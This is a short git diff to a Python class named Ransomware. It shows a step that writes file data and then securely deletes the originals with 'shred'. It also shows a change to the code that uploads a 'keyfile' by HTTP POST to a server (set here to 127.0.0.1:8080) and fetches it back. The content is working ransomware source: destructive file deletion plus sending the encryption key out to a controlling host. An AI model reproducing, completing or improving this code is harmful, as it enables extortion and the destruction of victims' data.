@@ -125,9 +125,6 @@ class Ransomware:
             f_dec.write(data)
             os.system("shred -v -z -u " + file_path +" >/dev/null 2>&1")
 
-            #f.seek(0)
-            #f.write(data)
-
 
 
 if __name__ == '__main__':
@@ -169,11 +166,13 @@ if __name__ == '__main__':
         rware.crypt_tmp(local_tmp)
 
 
-        url = '127.0.0.1:8080'
+        url = 'http://127.0.0.1:8080/keyfile'
         files = {'file': open('keyfile', 'rb')}
 
         
         r = requests.post(url, files=files)
 
         #r = requests.get(url='127.0.0.1',params =keyfile, port 8080)
+        r = requests.get(url)
+        r= r.text
 
